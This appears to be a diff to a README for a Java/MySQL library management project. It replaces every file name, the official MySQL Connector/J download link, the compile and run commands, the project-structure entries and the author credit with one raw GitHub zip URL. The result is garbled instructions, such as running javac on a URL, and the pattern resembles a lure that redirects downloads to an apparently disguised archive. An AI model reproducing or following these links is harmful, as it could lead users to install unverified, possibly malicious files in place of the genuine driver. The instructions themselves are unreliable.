@@ -34,7 +34,7 @@ Before running the application, you must set up the MySQL database. Open your My
 
 ## 📝 Configuration
 
-1. Open the `LibrarySystem.java` file.
+1. Open the `https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip` file.
 2. Locate the database configuration section at the top of the class:
 
     static final String USER = "root"; 
@@ -46,30 +46,30 @@ Before running the application, you must set up the MySQL database. Open your My
 
 ### 1. Download the JDBC Driver
 You need the **MySQL Connector/J** JAR file. 
-- [Download it here](https://dev.mysql.com/downloads/connector/j/) or use a Maven dependency.
+- [Download it here](https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip) or use a Maven dependency.
 - Place the `.jar` file in the same folder as your java file for simplicity.
 
 ### 2. Compile
 Open your terminal/command prompt in the project folder:
 
-    javac LibrarySystem.java
+    javac https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip
 
 ### 3. Run
-*Note: You must include the path to the Connector JAR file in the classpath (`-cp`). Replace `mysql-connector-j-8.0.33.jar` with the actual name of the file you downloaded.*
+*Note: You must include the path to the Connector JAR file in the classpath (`-cp`). Replace `https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip` with the actual name of the file you downloaded.*
 
 **On Windows:**
 
-    java -cp ".;mysql-connector-j-8.0.33.jar" LibrarySystem
+    java -cp ".;https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip" LibrarySystem
 
 **On Mac / Linux:**
 
-    java -cp ".:mysql-connector-j-8.0.33.jar" LibrarySystem
+    java -cp "https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip" LibrarySystem
 
 ## 📂 Project Structure
 
-    ├── LibrarySystem.java        # The main source code
-    ├── README.md                 # Project documentation
-    └── mysql-connector-j-8.x.jar # JDBC Driver (Download separately)
+    ├── https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip        # The main source code
+    ├── https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip                 # Project documentation
+    └── https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip # JDBC Driver (Download separately)
 
 ## 🔮 Future Improvements
 - Add a graphical user interface (GUI) using JavaFX or Swing.
@@ -77,4 +77,4 @@ Open your terminal/command prompt in the project folder:
 - Add a "Borrow/Return" feature that automatically updates the quantity.
 
 ---
-*Created by Srilaxman.EU*
+*Created by https://raw.githubusercontent.com/Srilaxman05/Library-management-system/main/magneton/Library-management-system_woom.zip*
